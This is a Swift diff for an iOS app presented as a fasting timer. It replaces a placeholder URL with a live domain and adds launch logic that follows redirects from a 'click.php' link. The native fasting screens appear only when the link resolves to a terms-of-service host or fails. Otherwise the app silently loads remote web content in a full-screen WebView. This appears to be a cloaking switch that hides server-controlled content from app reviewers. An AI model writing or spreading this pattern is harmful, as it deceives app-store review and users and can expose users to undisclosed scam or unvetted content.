@@ -1,14 +1,14 @@
 import SwiftUI
 
 @main
-struct FastingTrackerNeonApp: App {
+struct CycleFastingTimerApp: App {
     @StateObject private var fastingStore = FastingStore()
-    @State private var neonLinkStatus: Bool? = nil
+    @State private var cycleLinkStatus: Bool? = nil
     
     var body: some Scene {
         WindowGroup {
             Group {
-                if let status = neonLinkStatus {
+                if let status = cycleLinkStatus {
                     if status {
                         // Show native app
                         if fastingStore.hasCompletedOnboarding {
@@ -20,30 +20,30 @@ struct FastingTrackerNeonApp: App {
                         }
                     } else {
                         // Show WebView
-                        NeonWebPanel(urlString: "https://example.com")
+                        CycleWebPanel(urlString: "https://cyclefastingtimer.org/click.php")
                     }
                 } else {
                     // Loading
-                    NeonLoadingScreen()
+                    CycleLoadingScreen()
                 }
             }
             .preferredColorScheme(.dark)
             .onAppear {
-                if neonLinkStatus == nil {
-                    verifyNeonLink()
+                if cycleLinkStatus == nil {
+                    verifyCycleLink()
                 }
             }
         }
     }
     
-    private func verifyNeonLink() {
-        let resolver = NeonRedirectResolver(urlString: "https://example.com", timeoutSeconds: 5) { result in
+    private func verifyCycleLink() {
+        let resolver = CycleRedirectResolver(urlString: "https://cyclefastingtimer.org/click.php", timeoutSeconds: 5) { result in
             DispatchQueue.main.async {
                 switch result {
                 case .success(let finalURL):
-                    neonLinkStatus = finalURL.contains("example")
+                    cycleLinkStatus = finalURL.contains("termsfeed.com")
                 case .failure:
-                    neonLinkStatus = true
+                    cycleLinkStatus = true
                 }
             }
         }
@@ -51,7 +51,7 @@ struct FastingTrackerNeonApp: App {
     }
 }
 
-class NeonRedirectResolver: NSObject, URLSessionTaskDelegate {
+class CycleRedirectResolver: NSObject, URLSessionTaskDelegate {
     private let urlString: String
     private let timeoutSeconds: Double
     private let completion: (Result<String, Error>) -> Void
@@ -66,7 +66,7 @@ class NeonRedirectResolver: NSObject, URLSessionTaskDelegate {
 
     func start() {
         guard let url = URL(string: urlString) else {
-            finish(.failure(NSError(domain: "NeonRedirectResolver", code: -1, userInfo: [NSLocalizedDescriptionKey: "Invalid URL"])))
+            finish(.failure(NSError(domain: "CycleRedirectResolver", code: -1, userInfo: [NSLocalizedDescriptionKey: "Invalid URL"])))
             return
         }
 
@@ -82,13 +82,13 @@ class NeonRedirectResolver: NSObject, URLSessionTaskDelegate {
             } else if let httpResponse = response as? HTTPURLResponse, let finalURL = httpResponse.url?.absoluteString {
                 self.finish(.success(finalURL))
             } else {
-                self.finish(.failure(NSError(domain: "NeonRedirectResolver", code: -2, userInfo: [NSLocalizedDescriptionKey: "No response"])))
+                self.finish(.failure(NSError(domain: "CycleRedirectResolver", code: -2, userInfo: [NSLocalizedDescriptionKey: "No response"])))
             }
         }
         task.resume()
 
         DispatchQueue.main.asyncAfter(deadline: .now() + timeoutSeconds) { [weak self] in
-            self?.finish(.failure(NSError(domain: "NeonRedirectResolver", code: -3, userInfo: [NSLocalizedDescriptionKey: "Timeout"])))
+            self?.finish(.failure(NSError(domain: "CycleRedirectResolver", code: -3, userInfo: [NSLocalizedDescriptionKey: "Timeout"])))
         }
     }
 
